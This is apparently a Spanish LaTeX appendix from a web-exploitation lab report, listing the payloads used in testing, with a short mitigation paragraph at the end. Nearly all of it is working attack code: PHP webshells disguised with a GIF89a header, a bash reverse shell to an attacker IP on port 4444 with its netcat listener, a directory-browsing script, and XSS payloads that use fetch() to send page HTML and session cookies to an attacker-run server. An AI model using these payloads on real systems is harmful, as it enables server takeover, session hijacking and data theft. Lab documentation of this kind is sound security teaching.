\crearanexo{Payloads PHP y XSS utilizados}{anexo:payloads_php_xss}

% ---------------------------------------------------

\subsubsection*{Objetivo}

Este apartado recoge los payloads utilizados durante las pruebas de explotación web. Su finalidad es facilitar la reproducción del laboratorio y documentar de forma ordenada los ficheros y cadenas empleados durante la validación.

\subsubsection*{Payload PHP básico}

Payload mínimo para ejecutar comandos mediante el parámetro \texttt{cmd}:

\begin{configbox}
<?php
    system($_GET['cmd']);
?>
\end{configbox}

Ejemplo de uso:

\begin{configbox}
http://<IP_SERVIDOR>:8080/uploads/shell.php?cmd=whoami
\end{configbox}

En el laboratorio, la versión \texttt{.php} directa debe ser bloqueada por la aplicación si el filtro de subida actúa sobre extensiones PHP simples.

\subsubsection*{Webshell disfrazada con cabecera GIF}

Fichero recomendado:

\begin{configbox}
terminal_url.gif.php
\end{configbox}

Contenido:

\begin{configbox}
GIF89a
<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    echo "<h2>Comando ejecutado:</h2>";
    echo "<pre>" . htmlspecialchars($cmd) . "</pre>";

    echo "<h2>Resultado:</h2>";
    echo "<pre>";
    system($cmd . " 2>&1");
    echo "</pre>";
} else {
    echo "Uso: terminal.php?cmd=whoami";
}
?>
\end{configbox}

Ejemplos de uso:

\begin{configbox}
http://<IP_SERVIDOR>:8080/uploads/terminal_url.gif.php?cmd=whoami
http://<IP_SERVIDOR>:8080/uploads/terminal_url.gif.php?cmd=id
http://<IP_SERVIDOR>:8080/uploads/terminal_url.gif.php?cmd=pwd
http://<IP_SERVIDOR>:8080/uploads/terminal_url.gif.php?cmd=ip+a
\end{configbox}

\subsubsection*{Webshell con formulario}

Fichero recomendado:

\begin{configbox}
web_shell_bonita.gif.php
\end{configbox}

Contenido:

\begin{configbox}
GIF89a
<?php
echo "<form method='GET'>";
echo "<input type='text' name='cmd'>";
echo "<input type='submit'>";
echo "</form>";

if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
\end{configbox}

Esta variante resulta útil para documentar la ejecución de comandos desde el navegador.

\subsubsection*{Payload de reverse shell}

Fichero recomendado:

\begin{configbox}
shell.gif.php
\end{configbox}

Contenido:

\begin{configbox}
GIF89a
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1'");
?>
\end{configbox}

Listener en Kali:

\begin{bashbox}
nc -lvnp 4444
\end{bashbox}

Ejecución:

\begin{configbox}
http://<IP_SERVIDOR>:8080/uploads/shell.gif.php
\end{configbox}

\subsubsection*{File browser básico}

Fichero recomendado:

\begin{configbox}
file_browser.gif.php
\end{configbox}

Contenido:

\begin{configbox}
GIF89a
<?php
$dir = $_GET['dir'] ?? '.';
$files = scandir($dir);

foreach ($files as $f) {
    echo "<a href='?dir=$f'>$f</a><br>";
}
?>
\end{configbox}

Ejemplos de uso:

\begin{configbox}
http://<IP_SERVIDOR>:8080/uploads/file_browser.gif.php
http://<IP_SERVIDOR>:8080/uploads/file_browser.gif.php?dir=/var/www/html
http://<IP_SERVIDOR>:8080/uploads/file_browser.gif.php?dir=/etc
\end{configbox}

\subsubsection*{Payloads XSS}

Payload básico de validación:

\begin{configbox}
<img src=x onerror=alert(1)>
\end{configbox}

Payload para enviar el contenido HTML de la página a un servidor controlado por el atacante:

\begin{configbox}
<img src=x onerror="fetch(`http://<IP_ATACANTE>:8000`,{method:`POST`,body:document.body.innerHTML})">
\end{configbox}

Payload para enviar cookies de sesión en caso de que sean accesibles desde JavaScript:

\begin{configbox}
<img src=x onerror="fetch(`http://<IP_ATACANTE>:8000`,{method:`POST`,body:document.cookie})">
\end{configbox}

Servidor HTTP temporal para recibir peticiones:

\begin{bashbox}
python3 -m http.server 8000
\end{bashbox}

\subsubsection*{Resumen de payloads}

\renewcommand{\arraystretch}{1.4}
\begin{table}[H]
    \centering
    \captionazul{Payloads utilizados durante la explotación web}

    \begin{tabular}{|C{4cm}|C{4cm}|C{5cm}|}
        \hline
        \rowcolor{blue!10}
        \textbf{Payload} & \textbf{Tipo} & \textbf{Uso principal} \\
        \hline
        \texttt{terminal\_url.gif.php} & GIF/PHP & Ejecución de comandos por URL \\
        \hline
        \texttt{web\_shell\_bonita.gif.php} & GIF/PHP & Ejecución de comandos desde formulario \\
        \hline
        \texttt{shell.gif.php} & GIF/PHP & Reverse shell hacia Kali \\
        \hline
        \texttt{file\_browser.gif.php} & GIF/PHP & Enumeración de directorios \\
        \hline
        \texttt{<img src=x onerror=...>} & XSS & Validación de ejecución JavaScript \\
        \hline
    \end{tabular}

    \label{tab:payloads_explotacion_web}
\end{table}
\renewcommand{\arraystretch}{1}

\subsubsection*{Mitigaciones recomendadas}

En un entorno real, este tipo de vulnerabilidades debería mitigarse aplicando controles como lista blanca estricta de extensiones, almacenamiento de archivos fuera del \textit{webroot}, deshabilitación de ejecución PHP en directorios de subida, renombrado de archivos, validación real del contenido y codificación de salida en todos los datos introducidos por el usuario.
